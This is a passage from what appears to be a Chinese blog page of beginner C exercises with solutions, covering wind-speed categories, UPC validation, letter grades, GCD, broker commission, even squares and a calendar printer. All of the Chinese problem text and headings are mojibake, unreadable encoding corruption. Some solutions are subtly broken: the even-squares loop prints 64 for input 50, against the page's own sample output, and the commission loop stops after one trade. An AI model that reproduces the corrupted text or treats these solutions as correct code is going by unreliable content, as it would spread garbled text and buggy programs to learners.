align="center">é€Ÿç‡ï¼ˆæµ·é‡Œ&#x2F;â¼©æ—¶ï¼‰</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center">å°äº 1</td><td align="center">Calmï¼ˆæ— é£ï¼‰</td></tr><tr><td align="center">1~3</td><td align="center">Light airï¼ˆè½»é£ï¼‰</td></tr><tr><td align="center">4~27</td><td align="center">Breezeï¼ˆå¾®é£ï¼‰</td></tr><tr><td align="center">28~47</td><td align="center">Galeï¼ˆâ¼¤é£ï¼‰</td></tr><tr><td align="center">48~63</td><td align="center">Stormï¼ˆæš´é£ï¼‰</td></tr><tr><td align="center">â¼¤äº63</td><td align="center">Hurricaneï¼ˆé£“é£ï¼‰</td></tr></tbody></table><p><em><strong>è¾“å‡ºèŒƒä¾‹ï¼š</strong></em></p><blockquote><p>Enter a wind speed: 1</p><p>Light air</p></blockquote><blockquote><p>Enter a wind speed: 27</p><p>Breeze</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> rate;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter a wind speed: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;rate);<br>    <span class="hljs-keyword">if</span> (rate &lt; <span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Calm&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rate &lt;= <span class="hljs-number">3</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Light air&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rate &lt;= <span class="hljs-number">27</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Breeze&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rate &lt;= <span class="hljs-number">47</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Gale&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rate &lt;= <span class="hljs-number">63</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Storm&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hurricane&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é€šç”¨äº§å“ä»£ç ï¼ˆUPC-Universal-Production-Codeï¼‰"><a href="#é€šç”¨äº§å“ä»£ç ï¼ˆUPC-Universal-Production-Codeï¼‰" class="headerlink" title="é€šç”¨äº§å“ä»£ç ï¼ˆUPC, Universal Production Codeï¼‰"></a>é€šç”¨äº§å“ä»£ç ï¼ˆUPC, Universal Production Codeï¼‰</h3><blockquote><p>ä¿®æ”¹å¦‚ä¸‹ç¨‹åºï¼Œä½¿å…¶å¯ä»¥æ£€æµ‹ UPC çš„æœ‰æ•ˆæ€§ã€‚åœ¨ç”¨æˆ·è¾“å…¥UPCåï¼Œç¨‹åºå°†è¾“å‡º VALID æˆ– NOT VALID ã€‚</p><p><em><strong>è¾“å‡ºèŒƒä¾‹ï¼š</strong></em></p><blockquote><p>Enter the first (single) digit: 0<br>Enter first group of five digits: 13800<br>Enter second group of five digits: 15173<br>Enter the last (single) digit: 5<br>VALID</p></blockquote><blockquote><p>Enter the first (single) digit: 0<br>Enter first group of five digits: 51500<br>Enter second group of five digits: 24128<br>Enter the last (single) digit: 7<br>NOT VALID</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* upc.c</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Computes a universal product code check digit</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> d, i1, i2, i3, i4, i5, j1, j2, j3, j4, j5, first_sum, second_sum, total, check;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the first (single) digit:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%1d&quot;</span>, &amp;d);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the first group of five digits:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%1d%1d%1d%1d%1d&quot;</span>, &amp;i1, &amp;i2, &amp;i3, &amp;i4, &amp;i5);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the second group of five digits:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%1d%1d%1d%1d%1d&quot;</span>, &amp;j1, &amp;j2, &amp;j3, &amp;j4, &amp;j5);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the last (single) digit: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;check);<br>    first_sum = d + i2 + i4 + j1 + j3 + j5;<br>    second_sum = i1 + i3 + i5 + j2 + j4;<br>    total = <span class="hljs-number">3</span> * first_sum + second_sum;<br><br>    check == <span class="hljs-number">9</span> - ((total - <span class="hljs-number">1</span>) % <span class="hljs-number">10</span>) ? <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;VALID\n&quot;</span>) : <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NOT VALID\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="å°†ç™¾åˆ†åˆ¶è½¬æ¢ä¸ºç­‰çº§åˆ¶ï¼ˆCentesimal-grade-to-Letter-gradeï¼‰"><a href="#å°†ç™¾åˆ†åˆ¶è½¬æ¢ä¸ºç­‰çº§åˆ¶ï¼ˆCentesimal-grade-to-Letter-gradeï¼‰" class="headerlink" title="å°†ç™¾åˆ†åˆ¶è½¬æ¢ä¸ºç­‰çº§åˆ¶ï¼ˆCentesimal-grade to Letter-gradeï¼‰"></a>å°†ç™¾åˆ†åˆ¶è½¬æ¢ä¸ºç­‰çº§åˆ¶ï¼ˆCentesimal-grade to Letter-gradeï¼‰</h3><blockquote><p>åˆ©ç”¨switchè¯­å¥ç¼–å†™ä¸€ä¸ªç¨‹åºï¼ŒæŠŠç”¨æ•°å­—è¡¨ç¤ºçš„æˆç»©è½¬åŒ–ä¸ºå­—æ¯è¡¨ç¤ºçš„ç­‰çº§ã€‚</p><p>ä½¿ç”¨ä¸‹é¢çš„ç­‰çº§è¯„å®šè§„åˆ™ï¼šAä¸º90<del>100ï¼ŒBä¸º80</del>89ï¼ŒCä¸º70<del>79ï¼ŒDä¸º60</del>69ï¼ŒFä¸º0~59ã€‚å¦‚æœæˆç»©å¤§äº100æˆ–å°äº0æ˜¾ç¤ºå‡ºé”™ä¿¡æ¯ã€‚</p><p><em><strong>è¾“å‡ºèŒƒä¾‹ï¼š</strong></em></p><blockquote><p>Enter numerical grade: 84<br>Letter grade: B</p></blockquote><blockquote><p>Enter numerical grade: -1<br>Error, grade must be between 0 and 100.</p></blockquote><p>æç¤ºï¼šæŠŠæˆç»©æ‹†åˆ†æˆ 2 ä¸ªæ•°å­—ï¼Œç„¶åä½¿ç”¨ switch è¯­å¥åˆ¤å®šåä½ä¸Šçš„æ•°å­—ã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> grade;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter numerical grade: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;grade);<br>    <span class="hljs-keyword">if</span> (grade &lt; <span class="hljs-number">0</span> || grade &gt; <span class="hljs-number">100</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error, grade must be between 0 and 100.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    grade /= <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">switch</span> (grade)<br>    &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">10</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Letter grade: A&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">9</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Letter grade: A&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Letter grade: B&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Letter grade: C&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Letter grade: D&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Letter grade: F&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Letter grade: F&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Letter grade: F&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Letter grade: F&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Letter grade: F&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Letter grade: F&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error, grade must be between 0 and 100.\n&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æœ€å¤§å…¬çº¦æ•°ï¼ˆGCD-Greatest-Common-Divisorï¼‰"><a href="#æœ€å¤§å…¬çº¦æ•°ï¼ˆGCD-Greatest-Common-Divisorï¼‰" class="headerlink" title="æœ€å¤§å…¬çº¦æ•°ï¼ˆGCD, Greatest Common Divisorï¼‰"></a>æœ€å¤§å…¬çº¦æ•°ï¼ˆGCD, Greatest Common Divisorï¼‰</h3><blockquote><p>ç¼–å†™ç¨‹åºï¼Œè¦æ±‚ç”¨æˆ·è¾“å…¥ä¸¤ä¸ªæ•´æ•°ï¼Œç„¶åè®¡ç®—è¿™ä¸¤ä¸ªæ•´æ•°çš„æœ€å¤§å…¬çº¦æ•°ï¼ˆGCD, Greatest Common Divisorï¼‰ã€‚</p><p><em><strong>è¾“å‡ºèŒƒä¾‹ï¼š</strong></em></p><blockquote><p>Enter two integers: 12 28<br>Greatest common divisor: 4</p></blockquote><blockquote><p>Enter two integersï¼š1 9<br>Greatest common divisorï¼š1</p></blockquote><p>æç¤ºï¼šæ±‚æœ€å¤§å…¬çº¦æ•°çš„ç»å…¸ç®—æ³• Euclid ç®—æ³•å¦‚ä¸‹ï¼š<br>åˆ†åˆ«è®©å˜é‡ m å’Œ n å­˜å‚¨ä¸¤ä¸ªæ•´æ•°ã€‚å¦‚æœ n ä¸º 0ï¼Œé‚£ä¹ˆåœæ­¢æ“ä½œï¼Œm ä¸­çš„å€¼æ˜¯ GCD ï¼›å¦åˆ™è®¡ç®— m é™¤ä»¥ n çš„ä½™æ•°ï¼ŒæŠŠ n ä¿å­˜åˆ° m ä¸­ï¼Œå¹¶æŠŠä½™æ•°ä¿å­˜åˆ° n ä¸­ï¼›é‡å¤ä¸Šè¿°æ“ä½œï¼Œæ¯æ¬¡éƒ½å…ˆåˆ¤æ–­næ˜¯å¦ä¸º 0 ã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">getGCD</span><span class="hljs-params">(<span class="hljs-type">int</span> m, <span class="hljs-type">int</span> n)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (n == <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> m;<br><br>    <span class="hljs-keyword">return</span> getGCD(n, m % n);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> m, n;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter two integers: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %d&quot;</span>, &amp;m, &amp;n);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Greatest common divisor: %d&quot;</span>, getGCD(m, n));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="è‚¡ç»çºªäººçš„ä½£é‡‘ï¼ˆBrokerageï¼‰"><a href="#è‚¡ç»çºªäººçš„ä½£é‡‘ï¼ˆBrokerageï¼‰" class="headerlink" title="è‚¡ç»çºªäººçš„ä½£é‡‘ï¼ˆBrokerageï¼‰"></a>è‚¡ç»çºªäººçš„ä½£é‡‘ï¼ˆBrokerageï¼‰</h3><blockquote><p>åœ¨ä¸‹åˆ—ç¨‹åºä¸­æ·»åŠ å¾ªç¯ï¼Œä»¥ä¾¿ç”¨æˆ·å¯ä»¥è¾“å…¥å¤šç¬”äº¤æ˜“å¹¶ä¸”ç¨‹åºå¯ä»¥è®¡ç®—æ¯æ¬¡çš„ä½£é‡‘ã€‚ç¨‹åºåœ¨ç”¨æˆ·è¾“å…¥çš„äº¤æ˜“é¢ä¸º 0 æ—¶ç»ˆæ­¢ã€‚</p><p><em><strong>è¾“å‡ºèŒƒä¾‹ï¼š</strong></em></p><blockquote><p>Enter value of trade: 30000<br>Commissionï¼š$166.00</p></blockquote><blockquote><p>Enter value of trade: 20000<br>Commissionï¼š$144.00</p></blockquote><blockquote><p>Enter value of trade: 0</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * broker.c</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">fff</span><span class="hljs-params">(<span class="hljs-type">float</span> value)</span><br>&#123;<br><br>    <span class="hljs-type">float</span> commission;<br>    <span class="hljs-keyword">if</span> (value &lt; <span class="hljs-number">2500.00f</span>)<br>        commission = <span class="hljs-number">30.00f</span> + <span class="hljs-number">.017</span>f * value;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value &lt; <span class="hljs-number">6250.00f</span>)<br>        commission = <span class="hljs-number">56.00f</span> + <span class="hljs-number">.0066</span>f * value;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value &lt; <span class="hljs-number">20000.00f</span>)<br>        commission = <span class="hljs-number">76.00f</span> + <span class="hljs-number">.0034</span>f * value;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value &lt; <span class="hljs-number">50000.00f</span>)<br>        commission = <span class="hljs-number">100.00f</span> + <span class="hljs-number">.0022</span>f * value;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value &lt; <span class="hljs-number">500000.00f</span>)<br>        commission = <span class="hljs-number">155.00f</span> + <span class="hljs-number">.0011</span>f * value;<br>    <span class="hljs-keyword">else</span><br>        commission = <span class="hljs-number">255.00f</span> + <span class="hljs-number">.0009</span>f * value;<br><br>    <span class="hljs-keyword">if</span> (commission &lt; <span class="hljs-number">39.00f</span>)<br>        commission = <span class="hljs-number">39.00f</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Commission: $%.2f\n\n&quot;</span>, commission);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">float</span> value;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter value of trade: &quot;</span>);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%f&quot;</span>, &amp;value);<br>        <span class="hljs-keyword">if</span> (!value)<br>            <span class="hljs-keyword">break</span>;<br><br>        fff(value);<br>        <span class="hljs-type">char</span> c = getchar();<br>        <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;\n&#x27;</span>)<br>        &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="å¶æ•°å¹³æ–¹ï¼ˆSquare-of-Even-Numberï¼‰"><a href="#å¶æ•°å¹³æ–¹ï¼ˆSquare-of-Even-Numberï¼‰" class="headerlink" title="å¶æ•°å¹³æ–¹ï¼ˆSquare of Even Numberï¼‰"></a>å¶æ•°å¹³æ–¹ï¼ˆSquare of Even Numberï¼‰</h3><blockquote><p>ç¼–å†™ç¨‹åºï¼Œæç¤ºç”¨æˆ·è¾“å…¥ä¸€ä¸ªæ•° nï¼Œç„¶åæ˜¾ç¤ºå‡º 1~n çš„æ‰€æœ‰å¶æ•°çš„å¹³æ–¹å€¼ã€‚</p><p><em><strong>è¾“å‡ºèŒƒä¾‹ï¼š</strong></em></p><blockquote><p>Enter a number: 100<br>4<br>16<br>36<br>64<br>100</p></blockquote><blockquote><p>Enter a number: 50<br>4<br>16<br>36</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;math.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> n, i = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter a number: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;n);<br>    <span class="hljs-keyword">while</span> (i * i &lt; n)<br>    &#123;<br>        i += <span class="hljs-number">2</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, i * i);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æ—¥å†ï¼ˆCalendar-Monthï¼‰"><a href="#æ—¥å†ï¼ˆCalendar-Monthï¼‰" class="headerlink" title="æ—¥å†ï¼ˆCalendar Monthï¼‰"></a>æ—¥å†ï¼ˆCalendar Monthï¼‰</h3><blockquote><p>ç¼–å†™ç¨‹åºæ˜¾ç¤ºå•æœˆçš„æ—¥å†ã€‚ç”¨æˆ·æŒ‡å®šè¿™ä¸ªæœˆçš„å¤©æ•°å’Œè¯¥æœˆèµ·å§‹æ—¥æ˜¯æ˜ŸæœŸå‡ ã€‚</p><p><em><strong>è¾“å‡ºèŒƒä¾‹ï¼š</strong></em></p><blockquote><p>Enter number of days in month: 31</p><p>Enter starting day of the week(1&#x3D;Sun, 7&#x3D;Sat): 3</p></blockquote><table><thead><tr><th align="center">æ—¥</th><th align="center">ä¸€</th><th align="center">äºŒ</th><th align="center">ä¸‰</th><th align="center">å››</th><th align="center">äº”</th><th align="center">å…­</th></tr></thead><tbody><tr><td align="center"></td><td align="center"></td><td align="center">1</td><td align="center">2</td><td align="center">3</td><td align="center">4</td><td align="center">5</td></tr><tr><td align="center">6</td><td align="center">7</td><td align="center">8</td><td align="center">9</td><td align="center">10</td><td align="center">11</td><td align="center">12</td></tr><tr><td align="center">13</td><td align="center">14</td><td align="center">15</td><td align="center">16</td><td align="center">17</td><td align="center">18</td><td align="center">19</td></tr><tr><td align="center">20</td><td align="center">21</td><td align="center">22</td><td align="center">23</td><td align="center">24</td><td align="center">25</td><td align="center">26</td></tr><tr><td align="center">27</td><td align="center">28</td><td align="center">29</td><td align="center">30</td><td align="center">31</td><td align="center"></td><td align="center"></td></tr></tbody></table></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">outputCalender</span><span class="hljs-params">(<span class="hljs-type">int</span> days, <span class="hljs-type">int</span> start)</span><br>&#123;<br>    start %= <span class="hljs-number">8</span>;<br>    <span class="hljs-type">int</span> counts = <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">// printf(&quot;æ—¥\tä¸€\täºŒ\tä¸‰\tå››\täº”\tå…­\n&quot;);</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (days + start - <span class="hljs-number">1</span>) / <span class="hljs-number">7</span> + <span class="hljs-number">1</span>; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">7</span>; j++)<br>        &#123;<br>            <span class="hljs-keyword">if</span> ((i == <span class="hljs-number">0</span> &amp;&amp; j &lt; start - <span class="hljs-number">1</span>) || counts &gt; days)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\t&quot;</span>);<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\t&quot;</span>, counts++);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> days, start;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;days);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;start);<br>    outputCalender(days, start);<br><br>    <span 